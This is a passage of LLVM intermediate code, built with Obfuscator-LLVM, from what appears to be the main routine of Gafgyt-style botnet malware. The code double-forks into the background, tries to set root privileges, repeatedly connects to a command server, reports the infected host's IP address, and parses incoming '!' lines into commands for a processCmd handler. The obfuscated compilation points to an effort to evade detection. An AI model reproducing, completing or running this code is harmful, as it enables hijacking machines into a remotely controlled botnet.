  %12 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %13 = tail call i32 @getpid() #3
  %14 = xor i32 %13, %12
  tail call void @init_rand(i32 %14)
  %15 = tail call i32 @fork() #3
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %19, label %17

; <label>:17:                                     ; preds = %2
  %18 = call i32 @waitpid(i32 %15, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #16
  unreachable

; <label>:19:                                     ; preds = %2
  %20 = tail call i32 @fork() #3
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %23, label %22

; <label>:22:                                     ; preds = %19
  tail call void @exit(i32 0) #16
  unreachable

; <label>:23:                                     ; preds = %19
  %24 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i64 0, i64 0)) #3
  %25 = tail call i32 @setuid(i32 0) #3
  %26 = tail call i32 @seteuid(i32 0) #3
  %27 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %28 = tail call i32 @fork() #3
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %.lr.ph107.preheader, label %.loopexit78

.lr.ph107.preheader:                              ; preds = %23
  br label %.lr.ph107

.lr.ph107:                                        ; preds = %.lr.ph107.preheader, %32
  %30 = tail call i32 @initConnection()
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %36, label %32

; <label>:32:                                     ; preds = %.lr.ph107
  %33 = tail call i32 @sleep(i32 5) #3
  %34 = tail call i32 @fork() #3
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %.lr.ph107, label %.loopexit78.loopexit126

; <label>:36:                                     ; preds = %.lr.ph107
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %39 = tail call i8* @inet_ntoa(i32 %38) #3
  %40 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.113, i64 0, i64 0), i8* %39, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i64 0, i64 0))
  tail call void @ioctl_keepalive()
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %43 = call i32 @recvLine(i32 %41, i8* nonnull %42, i32 4096)
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %.loopexit78, label %.preheader77.lr.ph

.preheader77.lr.ph:                               ; preds = %36
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %46 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.preheader77

.preheader77:                                     ; preds = %.preheader77.lr.ph, %.backedge
  %47 = phi i32 [ %43, %.preheader77.lr.ph ], [ %94, %.backedge ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %.preheader77
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %.lr.ph92._crit_edge
  %indvars.iv = phi i64 [ %55, %.lr.ph92._crit_edge ], [ 0, %.lr.ph92.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #3
  %54 = icmp sgt i32 %53, 0
  %55 = add nuw i64 %indvars.iv, 1
  br i1 %54, label %.preheader, label %.lr.ph92._crit_edge

.preheader:                                       ; preds = %.lr.ph92
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %61 = phi i32* [ %70, %.lr.ph ], [ %58, %.lr.ph.preheader ]
  %62 = phi i64 [ %67, %.lr.ph ], [ %55, %.lr.ph.preheader ]
  %.06584 = phi i32 [ %.065, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %.065.in83 = phi i32 [ %.06584, %.lr.ph ], [ %59, %.lr.ph.preheader ]
  %63 = getelementptr inbounds i32, i32* %61, i64 %62
  %64 = load i32, i32* %63, align 4
  %65 = zext i32 %.065.in83 to i64
  %66 = getelementptr inbounds i32, i32* %61, i64 %65
  store i32 %64, i32* %66, align 4
  %.065 = add i32 %.06584, 1
  %67 = zext i32 %.065 to i64
  %68 = load i64, i64* @numpids, align 8
  %69 = icmp ult i64 %67, %68
  %70 = load i32*, i32** @pids, align 8
  br i1 %69, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.065.in.lcssa = phi i32 [ %59, %.preheader ], [ %.06584, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %70, %._crit_edge.loopexit ]
  %71 = zext i32 %.065.in.lcssa to i64
  %72 = getelementptr inbounds i32, i32* %.lcssa, i64 %71
  store i32 0, i32* %72, align 4
  %73 = load i64, i64* @numpids, align 8
  %74 = add i64 %73, -1
  store i64 %74, i64* @numpids, align 8
  %75 = shl i64 %73, 2
  %76 = call noalias i8* @malloc(i64 %75) #3
  %77 = bitcast i8* %76 to i32*
  %78 = icmp eq i64 %74, 0
  %79 = load i32*, i32** @pids, align 8
  br i1 %78, label %._crit_edge89, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %.lr.ph88
  %80 = phi i64 [ %85, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %.16686 = phi i32 [ %84, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %81 = getelementptr inbounds i32, i32* %79, i64 %80
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i32, i32* %77, i64 %80
  store i32 %82, i32* %83, align 4
  %84 = add i32 %.16686, 1
  %85 = zext i32 %84 to i64
  %86 = icmp ult i64 %85, %74
  br i1 %86, label %.lr.ph88, label %._crit_edge89.loopexit

._crit_edge89.loopexit:                           ; preds = %.lr.ph88
  br label %._crit_edge89

._crit_edge89:                                    ; preds = %._crit_edge89.loopexit, %._crit_edge
  %87 = bitcast i32* %79 to i8*
  call void @free(i8* %87) #3
  store i8* %76, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph92._crit_edge

.lr.ph92._crit_edge:                              ; preds = %.lr.ph92, %._crit_edge89
  %sext = shl i64 %55, 32
  %88 = ashr exact i64 %sext, 32
  %89 = load i64, i64* @numpids, align 8
  %90 = icmp ult i64 %88, %89
  br i1 %90, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %.lr.ph92._crit_edge
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %.preheader77
  %91 = sext i32 %47 to i64
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  call void @trim(i8* nonnull %42)
  %strncmp = call i32 @strncmp(i8* nonnull %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %.backedge, label %96

.backedge.loopexit:                               ; preds = %.lr.ph105
  br label %.backedge

.backedge.loopexit125:                            ; preds = %.preheader108
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit125, %.backedge.loopexit, %._crit_edge102.thread, %._crit_edge93, %._crit_edge102, %98
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i32 @recvLine(i32 %93, i8* nonnull %42, i32 4096)
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %.loopexit78.loopexit, label %.preheader77

; <label>:96:                                     ; preds = %._crit_edge93
  %strncmp69 = call i32 @strncmp(i8* nonnull %42, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i64 0, i64 0), i64 3)
  %cmp70 = icmp eq i32 %strncmp69, 0
  br i1 %cmp70, label %97, label %98

; <label>:97:                                     ; preds = %96
  call void @exit(i32 0) #16
  unreachable

; <label>:98:                                     ; preds = %96
  %99 = load i8, i8* %42, align 16
  %100 = icmp eq i8 %99, 33
  br i1 %100, label %.preheader108.preheader, label %.backedge

.preheader108.preheader:                          ; preds = %98
  br label %.preheader108

.preheader108:                                    ; preds = %.preheader108.preheader, %102
  %.063 = phi i8* [ %103, %102 ], [ %45, %.preheader108.preheader ]
  %101 = load i8, i8* %.063, align 1
  switch i8 %101, label %102 [
    i8 0, label %.backedge.loopexit125
    i8 32, label %104
  ]

; <label>:102:                                    ; preds = %.preheader108
  %103 = getelementptr inbounds i8, i8* %.063, i64 1
  br label %.preheader108

; <label>:104:                                    ; preds = %.preheader108
  store i8 0, i8* %.063, align 1
  %105 = call i64 @strlen(i8* %45) #14
  %106 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %105
  %107 = getelementptr inbounds i8, i8* %106, i64 2
  br label %108

; <label>:108:                                    ; preds = %113, %104
  %109 = call i64 @strlen(i8* %107) #14
  %110 = add i64 %109, -1
  %111 = getelementptr inbounds i8, i8* %107, i64 %110
  %112 = load i8, i8* %111, align 1
  switch i8 %112, label %.preheader75.preheader [
    i8 13, label %113
    i8 10, label %113
  ]

.preheader75.preheader:                           ; preds = %108
  br label %.preheader75

; <label>:113:                                    ; preds = %108, %108
  store i8 0, i8* %111, align 1
  br label %108

.preheader75:                                     ; preds = %.preheader75.preheader, %115
  %.064 = phi i8* [ %116, %115 ], [ %107, %.preheader75.preheader ]
  %114 = load i8, i8* %.064, align 1
  switch i8 %114, label %115 [
    i8 32, label %117
    i8 0, label %117
  ]

; <label>:115:                                    ; preds = %.preheader75
  %116 = getelementptr inbounds i8, i8* %.064, i64 1
  br label %.preheader75

; <label>:117:                                    ; preds = %.preheader75, %.preheader75
  store i8 0, i8* %.064, align 1
  %118 = getelementptr inbounds i8, i8* %.064, i64 1
  %119 = load i8, i8* %107, align 1
  %120 = icmp eq i8 %119, 0
  br i1 %120, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %117
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %121 = phi i8 [ %126, %.lr.ph96 ], [ %119, %.lr.ph96.preheader ]
  %.06294 = phi i8* [ %125, %.lr.ph96 ], [ %107, %.lr.ph96.preheader ]
  %122 = zext i8 %121 to i32
  %123 = call i32 @toupper(i32 %122) #14
  %124 = trunc i32 %123 to i8
  store i8 %124, i8* %.06294, align 1
  %125 = getelementptr inbounds i8, i8* %.06294, i64 1
  %126 = load i8, i8* %125, align 1
  %127 = icmp eq i8 %126, 0
  br i1 %127, label %._crit_edge97.loopexit, label %.lr.ph96

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %117
  %128 = call i8* @strtok(i8* %118, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i64 0, i64 0)) #3
  store i8* %107, i8** %46, align 16
  %129 = icmp eq i8* %128, null
  br i1 %129, label %._crit_edge102.thread, label %.lr.ph101.preheader

.lr.ph101.preheader:                              ; preds = %._crit_edge97
  br label %.lr.ph101

._crit_edge102.thread:                            ; preds = %._crit_edge97
  call void @processCmd(i32 1, i8** nonnull %46)
  br label %.backedge

.lr.ph101:                                        ; preds = %.lr.ph101.preheader, %142
  %.06099 = phi i8* [ %143, %142 ], [ %128, %.lr.ph101.preheader ]
  %.06198 = phi i32 [ %.1, %142 ], [ 1, %.lr.ph101.preheader ]
  %130 = load i8, i8* %.06099, align 1
  %131 = icmp eq i8 %130, 10
  br i1 %131, label %142, label %132

; <label>:132:                                    ; preds = %.lr.ph101
  %133 = call i64 @strlen(i8* nonnull %.06099) #14
  %134 = add i64 %133, 1
  %135 = call noalias i8* @malloc(i64 %134) #3
  %136 = sext i32 %.06198 to i64
  %137 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %136
  store i8* %135, i8** %137, align 8
  %138 = call i64 @strlen(i8* nonnull %.06099) #14
  %139 = add i64 %138, 1
  call void @llvm.memset.p0i8.i64(i8* %135, i8 0, i64 %139, i32 1, i1 false)
  %140 = call i8* @strcpy(i8* %135, i8* nonnull %.06099) #3
  %141 = add nsw i32 %.06198, 1
  br label %142

; <label>:142:                                    ; preds = %.lr.ph101, %132
  %.1 = phi i32 [ %141, %132 ], [ %.06198, %.lr.ph101 ]
  %143 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i64 0, i64 0)) #3
  %144 = icmp eq i8* %143, null
  br i1 %144, label %._crit_edge102, label %.lr.ph101

._crit_edge102:                                   ; preds = %142
  call void @processCmd(i32 %.1, i8** nonnull %46)
  %145 = icmp sgt i32 %.1, 1
  br i1 %145, label %.lr.ph105.preheader, label %.backedge

.lr.ph105.preheader:                              ; preds = %._crit_edge102
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %.lr.ph105
  %indvars.iv115 = phi i64 [ %indvars.iv.next116, %.lr.ph105 ], [ 1, %.lr.ph105.preheader ]
  %146 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv115
  %147 = load i8*, i8** %146, align 8
  call void @free(i8* %147) #3
  %indvars.iv.next116 = add nuw nsw i64 %indvars.iv115, 1
  %exitcond = icmp eq i64 %indvars.iv.next116, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph105

.loopexit78.loopexit:                             ; preds = %.backedge
  br label %.loopexit78

.loopexit78.loopexit126:                          ; preds = %32
  br label %.loopexit78

.loopexit78:                                      ; preds = %.loopexit78.loopexit126, %.loopexit78.loopexit, %23, %36
  ret i32 0
}

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @seteuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind returns_twice }
attributes #16 = { noreturn nounwind }
attributes #17 = { nounwind readnone }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146710168}
!14 = !{i32 -2146709460}
!15 = distinct !{!15, !2, !3}
!16 = distinct !{!16, !17, !2, !3}
!17 = !{!"llvm.loop.unroll.runtime.disable"}
!18 = distinct !{!18, !2, !3}
!19 = distinct !{!19, !17, !2, !3}
